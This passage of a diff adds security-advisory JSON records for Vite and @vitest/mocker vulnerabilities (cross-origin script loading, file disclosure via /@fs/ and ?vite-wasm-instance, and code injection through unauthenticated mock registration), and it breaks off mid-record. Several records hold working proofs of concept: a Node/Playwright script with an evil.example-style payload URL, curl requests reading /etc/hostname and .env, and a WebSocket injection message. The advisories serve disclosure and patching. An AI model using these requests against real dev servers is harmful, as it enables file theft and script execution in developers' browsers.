+      "overview": "### Summary\n\nWhen accessing a malicious site while a dev server using Vite is running, that site was able to load scripts in a page served by the dev server.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- the dev server passes an unchanged browser request URL to `server.transformIndexHtml`: this is normally used for `server.middlewareMode: true` or `appType: 'custom'`. The internal call for `appType: 'spa'` and `appType: 'mpa'` does not match this.\n- the transformed HTML contains an inline module script\n- from the script in the page served by the dev server, the app stores sensitive values in the location accessible or allows critical actions\n\n### Details\n\n[Vite's SSR guide for 8.2.1](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/docs/guide/ssr.md#L119-L131) documents the affected setup. The application embeds Vite in middleware mode, reads trusted HTML, and passes the browser's unchanged request URL to the transform:\n\n```js\nconst url = req.originalUrl\ntemplate = await vite.transformIndexHtml(url, template)\n```\n\nFor a development server at `http://localhost:5173`, an attacker can send this URL:\n\n```text\nhttp://localhost:5173//evil.example/payload.js?/../../package.json\n```\n\nIn Vite 8.2.1, [`createDevHtmlTransformFn` and `getHtmlFilename` in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L99-L115) use the request URL as both the transform `path` and the input to `path.join`. The value passed to `path.join` still includes its query text.\n\nChromium preserves `/../../package.json` because it follows `?` and is therefore query text. Vite treats the same characters as filesystem path components, so the `..` components resolve the derived filename to the existing project `package.json`.\n\n[The existing file branch in `indexHtml.ts`](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L216-L232) checks that filename with `fs.existsSync`, then preserves the `htmlPath` supplied by the attacker as `proxyModuleUrl`. [The inline module rewrite in the same file](https://github.com/vitejs/vite/blob/421615865dad3ed39137d17281814fc78a41246c/packages/vite/src/node/server/middlewares/indexHtml.ts#L271-L278) writes that value into the generated `src`:\n\n```html\n<script type=\"module\" src=\"//evil.example/payload.js?/../../package.json?html-proxy&index=0.js\"></script>\n```\n\nThe generated value is a valid URL. Its leading `//` tells the browser to request the module from `evil.example` using the Vite page's scheme. The attacker returns JavaScript for that request, and Chromium executes it in the Vite page.\n\n### PoC\n\n```js\nimport { createServer as createHttpServer } from 'node:http'\nimport { createRequire } from 'node:module'\nimport { dirname, join } from 'node:path'\nimport { fileURLToPath, pathToFileURL } from 'node:url'\n\nconst directory = dirname(fileURLToPath(import.meta.url))\nconst require = createRequire(join(directory, 'package.json'))\nconst { chromium } = require('playwright-chromium')\nconst viteModule = await import(\n  pathToFileURL(require.resolve('vite')).href\n)\nconst createViteServer =\n  viteModule.createServer ?? viteModule.default.createServer\n\n// This loopback server stands in for a separately hosted attacker website.\nconst attackerPort = 4173\nconst exploitPath = `//127.0.0.1:${attackerPort}/payload.js?/../../package.json`\nconst html = '<script type=\"module\">document.body.textContent = \"Vite app\"</script>'\n\nconst listen = (server, port = 0) =>\n  new Promise((resolve, reject) => {\n    server.once('error', reject)\n    server.listen(port, '127.0.0.1', () => {\n      server.off('error', reject)\n      resolve(server.address().port)\n    })\n  })\n\nconst close = (server) =>\n  new Promise((resolve, reject) => {\n    server.close((error) => (error ? reject(error) : resolve()))\n  })\n\nlet attackerRequest = null\nconst attacker = createHttpServer((request, response) => {\n  attackerRequest = request.url\n  response.writeHead(200, {\n    'access-control-allow-origin': '*',\n    'content-type': 'text/javascript',\n  })\n  response.end(\n    \"document.documentElement.dataset.viteXssPoc = 'executed'\",\n  )\n})\n\nconst vite = await createViteServer({\n  appType: 'custom',\n  configFile: false,\n  root: directory,\n  server: {\n    hmr: false,\n    middlewareMode: true,\n    watch: null,\n  },\n})\n\nconst application = createHttpServer((request, response) => {\n  vite.middlewares(request, response, async (error) => {\n    if (error) {\n      response.destroy(error)\n      return\n    }\n\n    try {\n      const transformed = await vite.transformIndexHtml(request.url, html)\n      response.writeHead(200, { 'content-type': 'text/html' })\n      response.end(transformed)\n    } catch (transformError) {\n      response.destroy(transformError)\n    }\n  })\n})\n\nawait listen(attacker, attackerPort)\nconst applicationPort = await listen(application)\nconst browser = await chromium.launch({ headless: true })\n\ntry {\n  const page = await browser.newPage()\n  await page.goto(`http://127.0.0.1:${applicationPort}${exploitPath}`)\n  await page.waitForFunction(\n    () => document.documentElement.dataset.viteXssPoc === 'executed',\n  )\n\n  console.log(`attacker request: ${attackerRequest}`)\n  console.log('JavaScript from the attacker server executed in the Vite page')\n} finally {\n  await browser.close()\n  await close(application)\n  await vite.close()\n  await close(attacker)\n}\n```\n\nObserved output on Vite 8.2.1:\n```text\nattacker request: /payload.js?/../../package.json?html-proxy&index=0.js\nJavaScript from the attacker server executed in the Vite page\n```",
+      "reported_by": null,
+      "title": "Vite: Cross origin script execution through Vite custom middleware",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112945"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.2.0 <=8.2.3",
+      "github_advisory_id": "GHSA-9jrq-w75r-8gcw",
+      "recommendation": "Upgrade to version 8.2.4 or later",
+      "patched_versions": ">=8.2.4",
+      "updated": "2026-10-21T16:48:15.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-80"
+      ],
+      "url": "https://github.com/advisories/GHSA-9jrq-w75r-8gcw"
+    },
+    "1242733": {
+      "findings": [
+        {
+          "version": "8.2.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-rq7h-c2jc-7f22\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112946\n- https://github.com/vitejs/vite/pull/23656\n- https://github.com/vitejs/vite/commit/170b92791421bcd484f7325936d989a82d6bd4aa\n- https://github.com/vitejs/vite/commit/45c0e3392a298626955a0ab93a8e51232daac721\n- https://github.com/vitejs/vite/commit/c3e06f92e969952466b4e2f5801e85e1e00cd905\n- https://github.com/vitejs/vite/commit/e570d8d016096b5f8f6f09808376ca6cf73f27d0\n- https://github.com/vitejs/vite/commit/f0d76c7da13d5e794807b82f0b86c1931a8438e3\n- https://github.com/advisories/GHSA-rq7h-c2jc-7f22",
+      "created": "2026-10-21T16:47:42.000Z",
+      "id": 1242733,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe content of files outside `server.fs` setting can be returned to the browser if the project imports a file path concatenated with the `root`. For example, if the project references `<path-to-project-root>/etc/hosts`, the content of `/etc/hosts` was possible to be returned.\n\nThe content of files outside the `server.fs.allow` option can be returned to the browser when a project imports a file whose root-relative path matches an absolute path on the host. For example, referencing `<project-root>/etc/hosts` could make Vite return the host's `/etc/hosts` file.\n\n### Impact\n\nOnly apps that meet all of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network (using `--host` or the [`server.host` option](https://vite.dev/config/server-options#server-host))\n- contain an imported file whose root-relative browser URL is also the absolute path of a readable file on the host\n- The sensitive file is not matched by [`server.fs.deny`](https://vite.dev/config/server-options#server-fs-deny)\n- the dev server is not running on Windows\n\n### Details\n\nWhen Vite analyzes an in-root import, it rewrites the resolved module ID to a browser URL such as `/etc/hostname`. In affected versions, Vite converts that URL with `fsPathFromUrl` and adds the result to `safeModulePaths`. Because `fsPathFromUrl` ensures a leading slash without resolving the URL against the project root, the project URL `/etc/hostname` is recorded as if it were the absolute filesystem path `/etc/hostname`.\n\nFor a later request to `/@fs/etc/hostname`, the raw-filesystem middleware interprets `/etc/hostname` as an absolute path. The access check applies `server.fs.deny`, then accepts paths present in `safeModulePaths` before checking `server.fs.allow`. As a result, the request can return the host file instead of the project file that originally populated `safeModulePaths`.\n\n### PoC\nThe following example requires Linux with a readable `/etc/hostname`:\n```bash\n$ mkdir vite-safe-module-path-poc\n$ cd vite-safe-module-path-poc\n$ npm init -y\n$ npm install vite@8.3.1\n$ mkdir -p etc\n$ echo 'PROJECT-DECOY\\n' > etc/hostname\n$ echo 'import \"./etc/hostname\"\\n' > main.js\n$ npx vite --host 127.0.0.1\n```\n\nIn another terminal:\n```bash\n$ curl -o /dev/null -s -w '%{http_code}\\n' http://127.0.0.1:5173/main.js\n200\n$ curl -sS -o response -w '%{http_code}\\n' http://127.0.0.1:5173/@fs/etc/hostname\n200\n$ cmp -s response /etc/hostname && echo 'response matches host file'\nresponse matches host file\n```",
+      "reported_by": null,
+      "title": "Vite: Files outside `server.fs.allow` could be served when project paths match system paths on non-Windows machine",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112946"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.2.0 <=8.2.3",
+      "github_advisory_id": "GHSA-rq7h-c2jc-7f22",
+      "recommendation": "Upgrade to version 8.2.4 or later",
+      "patched_versions": ">=8.2.4",
+      "updated": "2026-10-21T16:47:43.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-284"
+      ],
+      "url": "https://github.com/advisories/GHSA-rq7h-c2jc-7f22"
+    },
+    "1242736": {
+      "findings": [
+        {
+          "version": "8.2.2",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11 > vite@8.2.2",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > vite@8.2.2"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitejs/vite/security/advisories/GHSA-vfpm-58rq-9qcg\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112947\n- https://github.com/vitejs/vite/pull/23655\n- https://github.com/vitejs/vite/commit/b6c6d2fb3f853aab4092dc25f0d6816a96c23dff\n- https://github.com/vitejs/vite/commit/ba8b7ab43b4afa5d0292ab4b6e3a7b5033cc9c73\n- https://github.com/advisories/GHSA-vfpm-58rq-9qcg",
+      "created": "2026-10-21T16:47:15.000Z",
+      "id": 1242736,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe first 4 bytes of files outside of `server.fs` setting can be returned to the browser by a request containing `?vite-wasm-instance`.\n\n### Impact\n\n Only apps that match one of the following conditions are affected:\n\n- explicitly expose the Vite dev server to the network using `--host` or the [`server.host`](https://vite.dev/config/server-options#server-host) option\n- there's a file that has a sensitive information in **the first 4 bytes**\n- uses Node.js or Deno to run Vite (if Bun is used, it is not affected)\n\n### Details\nRequests containing the `?vite-wasm-instance` query are handled by the internal Wasm plugin's `load` hook. The hook removes the query and reads the resulting path directly from disk, but the `server.fs` checks were not applied.\n\nAfter reading the file, Vite attempts to parse it as WebAssembly. When that parse fails, Node and deno throws an error that contains the first 4 bytes of the file.\n\n### PoC\n\nCreate a denied file and start an affected Vite dev server:\n\n```bash\necho 'SECRET_KEY=abc123\\n' > .env\nnpm run dev\ncurl 'http://localhost:5173/.env?vite-wasm-instance'\n```\n\nThis will show\n```\nFailed to parse WASM file \"<root>/.env\": WebAssembly.compile(): expected magic word 00 61 73 6d, found 53 45 43 52 @+0\n```",
+      "reported_by": null,
+      "title": "Vite: First 4 bytes of files outside of `server.fs` setting is exposed by `?vite-wasm-instance`",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112947"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "vite",
+      "vulnerable_versions": ">=8.2.0 <=8.2.3",
+      "github_advisory_id": "GHSA-vfpm-58rq-9qcg",
+      "recommendation": "Upgrade to version 8.2.4 or later",
+      "patched_versions": ">=8.2.4",
+      "updated": "2026-10-21T16:47:16.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22",
+        "CWE-200",
+        "CWE-209"
+      ],
+      "url": "https://github.com/advisories/GHSA-vfpm-58rq-9qcg"
+    },
+    "1242767": {
+      "findings": [
+        {
+          "version": "4.1.11",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-qxg6-89mg-rqv8\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112949\n- https://github.com/vitest-dev/vitest/commit/15cc006aa9f8683dc5f7e895d011fa7dc751ce35\n- https://github.com/vitest-dev/vitest/commit/b825313243dc55757e8d7c0f9e7a792135e13473\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.12\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.3\n- https://github.com/advisories/GHSA-qxg6-89mg-rqv8",
+      "created": "2026-10-21T19:54:26.000Z",
+      "id": 1242767,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\n`@vitest/mocker`'s `interceptorPlugin` accepts mock registrations on Vite's dev-server WebSocket with no authentication, and interpolates the mock's `url` into generated module source without escaping. A client that can reach the dev server can make it serve arbitrary JavaScript in place of any project module, which then runs in the developer's browser on the dev-server origin.\n\nSame handler and same unauthenticated caller as GHSA-82fw-gwwq-j7x9; that fix (`8ff9b9a9efca7c6cfd5243569440de8d7a33aec4`, PR #10972) hardened only the `redirect` branch and left the `manual` branch reaching the unescaped generator.\n\n### Patches\n\nFixed in `@vitest/mocker` 5.0.3, released on 2026-09-30 (PR #11377), and backported to 4.1.12. `createManualModuleSource` now serializes the module URL and the export names with `JSON.stringify`, so a registered mock cannot change the generated code.\n\nProjects that call `mockerPlugin()` or `interceptorPlugin()` directly need `@vitest/mocker` 4.1.12 or 5.0.3.\n\n### Details\n\n`packages/mocker/src/utils.ts:6-9` builds module source by string interpolation:\n\n```ts\nexport function createManualModuleSource(moduleUrl: string, exports: string[], globalAccessor = '\"__vitest_mocker__\"'): string {\n  const source = `\nconst __factoryModule__ = await globalThis[${globalAccessor}].getFactoryModule(\"${moduleUrl}\");\n`\n```\n\n`moduleUrl` lands inside a double-quoted JavaScript string with no escaping or validation.\n\n`packages/mocker/src/node/interceptorPlugin.ts:66-93` feeds it straight from the socket:\n\n```ts\nconfigureServer(server) {\n  if (options.registerWebSocketEvents === false) { return }\n  server.ws.on('vitest:interceptor:register', (event: MockedModuleSerialized) => {\n    if (event.type === 'manual') {\n      const module = ManualMockedModule.fromJSON(event, async () => {\n        const keys = await getFactoryExports(event.url)\n        return Object.fromEntries(keys.map(key => [key, null]))\n      })\n      registry.add(module)                       // no validation of `id` or `url`\n    }\n    else {\n      if (event.type === 'redirect') { /* fs allowlist check added in #10972 */ }\n```\n\n`event.id` chooses which module is hijacked; `event.url` is what gets interpolated. The `load` hook (`interceptorPlugin.ts:30-44`) then returns `createManualModuleSource(mock.url, exports, accessor)` for that id.\n\nWith `url = 'x\"); globalThis.ARES_INJECTED = 1; void(\"'` a request for `/src/app.js` is answered with valid, executable JavaScript:\n\n```js\nconst __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n```\n\n`getFactoryExports` (`interceptorPlugin.ts:103-117`) also takes the export-name array from the same socket, and those names are interpolated unescaped too — but each name is emitted into `__factoryModule__[\"X\"]`, `export { __0 as \"X\" }` and `resolvedModule[\"X\"]`, and no payload tested parses in all three positions (all nine candidates were rejected by the parser). It is a hardening gap, not a second usable vector; `url` is the exploited one.\n\n**Who can reach the socket.** Vite 8 answers HTTP 400 to any HMR upgrade carrying an `Origin` header it does not own, so a cross-origin browser page cannot open it — the PoC asserts this for `https://evil.example` and `http://localhost:3000`. The reachable attacker is a non-browser WebSocket client with access to the dev server's port, the same prerequisite under which GHSA-82fw-gwwq-j7x9 was published.\n\n### PoC\n\n`poc/mocker-manual-mock-injection/` — `repro.sh` (exit 0 = vulnerable), `poc.mjs`, `expected.txt`, `env.txt`. Everything lives under a fresh `mktemp` directory deleted on exit, the dev server binds to `127.0.0.1` on an ephemeral port, no external host is contacted, and the payload is only inspected as text — the script never evaluates it.\n\nEnvironment: commit `9e1166959e14bd32298d8a0e85352431c769ec7a`, `@vitest/mocker` 5.0.0, Node v22.23.1, Vite 8.0.11, ws 8.21.3, pnpm 11.24.0, Linux x86_64.\n\n```bash\ngit clone https://github.com/vitest-dev/vitest && cd vitest\ngit checkout 9e1166959e14bd32298d8a0e85352431c769ec7a\npnpm install && pnpm build\nREPO=$(pwd) bash /path/to/poc/mocker-manual-mock-injection/repro.sh\n```\n\nRequired configuration — the public setup documented in `packages/mocker/EXPORTS.md`, which the harness reproduces (`mockerPlugin()` wires `interceptorPlugin` the same way):\n\n```ts\nimport { interceptorPlugin } from '@vitest/mocker/node'\nexport default defineConfig({ plugins: [interceptorPlugin()] })   // or mockerPlugin()\n```\n\nThe attack is one WebSocket message to `ws://<host>:<port>/` with subprotocol `vite-hmr`:\n\n```json\n{ \"type\": \"custom\", \"event\": \"vitest:interceptor:register\",\n  \"data\": { \"type\": \"manual\", \"raw\": \"\", \"id\": \"<abs path of a served module>\",\n            \"url\": \"x\\\"); globalThis.ARES_INJECTED = 1; void(\\\"\" } }\n```\n\nthen answering the server's `vitest:interceptor:resolve` with `{\"type\":\"custom\",\"event\":\"vitest:interceptor:resolved\",\"data\":{\"url\":\"<same url>\",\"keys\":[\"a\"]}}`. The module id can be obtained from the same socket via `vitest:mocks:resolveId` when `mockerPlugin()` is used.\n\nObserved output:\n\n```\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin https://evil.example  result=400\nPASS  precondition: Vite rejects a WebSocket upgrade sent with Origin http://localhost:3000  result=400\nPASS  negative control: with no mock registered the real module is served\nPASS  negative control: a mock with a harmless url replaces the module but injects nothing\n--- module served for /src/app.js ---\n    const __factoryModule__ = await globalThis[\"__vitest_mocker__\"].getFactoryModule(\"x\"); globalThis.ARES_INJECTED = 1; void(\"\");\n\n    let __0 = __factoryModule__[\"a\"]\n    export { __0 as \"a\" }\n    if (__factoryModule__.__factoryPromise != null) {\n      __factoryModule__.__factoryPromise.then((resolvedModule) => {\n        __0 = resolvedModule[\"a\"];\n      })\n    }\nPASS  attacker statement is present in the module the dev server serves\nPASS  the real module body was replaced\nPASS  the injected module parses as JavaScript (Vite import analysis accepted it)\n\nRESULT: VULNERABLE\n```\n\n* **Positive control** — with no mock registered, `/src/app.js` is served with its real body, so the harness demonstrably works.\n* **Negative control** — the same registration with a harmless `url` replaces the module but injects nothing, attributing the injection to the payload rather than to mock registration.\n* **Precondition controls** — the two `Origin` probes record the boundary honestly.\n* Vite's import analysis rejects malformed output (an earlier deliberately-broken payload failed with \"content contains invalid JS syntax\"), so acceptance proves the injected module is valid, executable JavaScript.\n\nReproduced three times from a clean `mktemp` fixture, exit 0 each time.\n\n### Impact\n\nCode injection (CWE-94) by an unauthenticated client. The attacker picks any module id the project serves and replaces its body with arbitrary JavaScript, which executes in the developer's browser on the dev-server origin: reading source through the dev server, reading that origin's storage and cookies, driving further same-origin requests, and persisting across reloads while the mock stays registered. Nothing is written to disk, so it leaves no trace in the repository. Impacts developers who use the public `mockerPlugin()`/`interceptorPlugin()` API documented in `packages/mocker/EXPORTS.md`. Node runs do not register these handlers. Development-only — `configureServer` does not run for `vite build` or `vite preview`.\n\n### Credits\n\n- Thai Son Dinh from VinSOC Labs (R&D)\n\nDisclosure per CONTRIBUTING.md: the analysis and proof of concept were assisted by Claude (Claude Code). The findings were reviewed by the reporter above, who is submitting this report.",
+      "reported_by": null,
+      "title": "Vitest: Code injection via unauthenticated manual mock registration",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-112949"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "@vitest/mocker",
+      "vulnerable_versions": ">=2.1.0-beta.7 <4.1.12",
+      "github_advisory_id": "GHSA-qxg6-89mg-rqv8",
+      "recommendation": "Upgrade to version 4.1.12 or later",
+      "patched_versions": ">=4.1.12",
+      "updated": "2026-10-21T19:54:27.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-94",
+        "CWE-116",
+        "CWE-306"
+      ],
+      "url": "https://github.com/advisories/GHSA-qxg6-89mg-rqv8"
+    },
+    "1242769": {
+      "findings": [
+        {
+          "version": "4.1.11",
+          "paths": [
+            "cli > @paperclipai/server@link:../server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "cli > @paperclipai/server@link:../server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @better-auth/scim@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @better-auth/sso@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > @vercel/connect@0.6.1 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "server > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "ui > @better-auth/passkey@1.7.2 > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11",
+            "ui > better-auth@1.7.2 > vitest@4.1.11 > @vitest/mocker@4.1.11"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vitest-dev/vitest/security/advisories/GHSA-xp26-3454-mjgp\n- https://nvd.nist.gov/vuln/detail/CVE-2026-112950\n- https://github.com/vitest-dev/vitest/commit/15cc006aa9f8683dc5f7e895d011fa7dc751ce35\n- https://github.com/vitest-dev/vitest/commit/b825313243dc55757e8d7c0f9e7a792135e13473\n- https://github.com/vitest-dev/vitest/releases/tag/v4.1.12\n- https://github.com/vitest-dev/vitest/releases/tag/v5.0.3\n- https://github.com/advisories/GHSA-xp26-3454-mjgp",
+      "created": "2026-10-21T19:48:38.000Z",
+      "id": 1242769,
